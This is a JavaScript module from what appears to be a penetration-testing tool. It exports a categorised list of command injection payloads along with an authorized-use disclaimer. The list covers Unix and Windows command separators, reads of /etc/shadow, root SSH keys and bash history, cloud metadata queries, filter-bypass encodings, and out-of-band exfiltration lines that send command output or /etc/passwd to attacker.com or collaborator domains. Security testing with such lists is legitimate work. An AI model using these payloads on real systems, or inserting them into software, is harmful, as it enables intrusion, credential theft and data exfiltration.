// Command Injection Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const commandInjectionPayloads = {
  unixBasic: {
    name: 'Unix/Linux Basic Injection',
    description: 'Basic command injection payloads for Unix/Linux systems',
    category: 'Unix Basic',
    payloads: [
      {
        name: 'Semicolon separator',
        code: '; id'
      },
      {
        name: 'Pipe operator',
        code: '| id'
      },
      {
        name: 'AND operator (both run)',
        code: '&& id'
      },
      {
        name: 'OR operator (if first fails)',
        code: '|| id'
      },
      {
        name: 'Background execution',
        code: '& id'
      },
      {
        name: 'Backtick substitution',
        code: '`id`'
      },
      {
        name: 'Dollar-paren substitution',
        code: '$(id)'
      },
      {
        name: 'Newline separator',
        code: '\nid\n'
      }
    ]
  },
  windowsBasic: {
    name: 'Windows Basic Injection',
    description: 'Basic command injection payloads for Windows systems',
    category: 'Windows Basic',
    payloads: [
      {
        name: 'Semicolon separator',
        code: '; whoami'
      },
      {
        name: 'Pipe operator',
        code: '| whoami'
      },
      {
        name: 'AND operator',
        code: '& whoami'
      },
      {
        name: 'AND AND operator',
        code: '&& whoami'
      },
      {
        name: 'OR operator',
        code: '|| whoami'
      },
      {
        name: 'Batch variable injection',
        code: '& echo %USERNAME%'
      },
      {
        name: 'PowerShell call',
        code: '& powershell -c "whoami"'
      },
      {
        name: 'CMD /c injection',
        code: '& cmd /c "whoami"'
      }
    ]
  },
  fileRead: {
    name: 'File Read Payloads',
    description: 'Command injection payloads to read sensitive files',
    category: 'File Read',
    payloads: [
      {
        name: 'Read /etc/passwd',
        code: '; cat /etc/passwd'
      },
      {
        name: 'Read /etc/shadow',
        code: '; cat /etc/shadow'
      },
      {
        name: 'Read SSH key',
        code: '; cat /root/.ssh/id_rsa'
      },
      {
        name: 'Read environment variables',
        code: '; env'
      },
      {
        name: 'Windows user list',
        code: '& type C:\\Windows\\System32\\drivers\\etc\\hosts'
      },
      {
        name: 'Read web config',
        code: '; cat /var/www/html/config.php'
      },
      {
        name: 'Read bash history',
        code: '; cat ~/.bash_history'
      },
      {
        name: 'Read cron jobs',
        code: '; cat /etc/crontab'
      }
    ]
  },
  networkEnum: {
    name: 'Network Enumeration',
    description: 'Command injection payloads for internal network discovery',
    category: 'Network Enumeration',
    payloads: [
      {
        name: 'Ping host (Unix)',
        code: '; ping -c 1 {HOST}'
      },
      {
        name: 'DNS lookup',
        code: '; nslookup {HOST}'
      },
      {
        name: 'Network interfaces',
        code: '; ifconfig'
      },
      {
        name: 'IP address (modern)',
        code: '; ip a'
      },
      {
        name: 'Show routes',
        code: '; route -n'
      },
      {
        name: 'Open connections',
        code: '; netstat -an'
      },
      {
        name: 'Curl internal',
        code: '; curl http://169.254.169.254/latest/meta-data/'
      },
      {
        name: 'Wget internal',
        code: '; wget -qO- http://127.0.0.1/'
      }
    ]
  },
  bypassTechniques: {
    name: 'Filter Bypass Techniques',
    description: 'Payloads to bypass input filters and WAF protections',
    category: 'Bypass Techniques',
    payloads: [
      {
        name: 'Space via IFS',
        code: ';i$IFS$()d'
      },
      {
        name: 'Space via brace',
        code: ';{id,}'
      },
      {
        name: 'Lowercase bypass',
        code: ';WhOaMi'
      },
      {
        name: 'Double quote bypass',
        code: ';w"h"o"a"m"i'
      },
      {
        name: 'Single quote bypass',
        code: ";w'h'o'a'm'i"
      },
      {
        name: 'Backslash bypass',
        code: ';w\\hoami'
      },
      {
        name: 'Hex encoded command',
        code: ';$(printf "\\x77\\x68\\x6f\\x61\\x6d\\x69")'
      },
      {
        name: 'Base64 encoded command',
        code: ';$(echo "d2hvYW1p" | base64 -d)'
      }
    ]
  },
  oobExfil: {
    name: 'Out-of-Band Exfiltration',
    description: 'Command injection payloads for out-of-band data exfiltration using DNS/HTTP',
    category: 'OOB Exfiltration',
    payloads: [
      {
        name: 'DNS exfiltration (Unix)',
        code: '; nslookup $(whoami).{YOUR_COLLABORATOR_ID}.oastify.com'
      },
      {
        name: 'Burp Collaborator probe',
        code: '; curl http://{YOUR_COLLABORATOR_ID}.burpcollaborator.net/'
      },
      {
        name: 'Data via DNS TXT',
        code: '; host $(cat /etc/passwd | base64 | head -c 50).{YOUR_COLLABORATOR_ID}.oastify.com'
      },
      {
        name: 'HTTP exfil via curl',
        code: '; curl http://attacker.com/?data=$(id | base64)'
      },
      {
        name: 'HTTP exfil via wget',
        code: '; wget "http://attacker.com/?data=$(id | base64)"'
      }
    ]
  }
}

export const quickProbes = [
  '; id',
  '| id',
  '&& id',
  '`id`',
  '$(id)',
  '; whoami',
  '| whoami'
]

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(commandInjectionPayloads).forEach(payload => {
    categories.add(payload.category)
  })
  return Array.from(categories).sort()
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(commandInjectionPayloads).filter(
    ([, payload]) => payload.category === category
  )
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

Command injection attacks can be extremely dangerous and result in:
• Complete server compromise and remote code execution
• Unauthorized data access and exfiltration
• Privilege escalation to root/SYSTEM
• Lateral movement through internal networks
• Ransomware deployment and data destruction

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized command injection attacks are ILLEGAL and may result in:
• Criminal prosecution
• Civil liability
• Imprisonment
• Significant fines

By using this tool, you acknowledge responsibility for your actions.
`
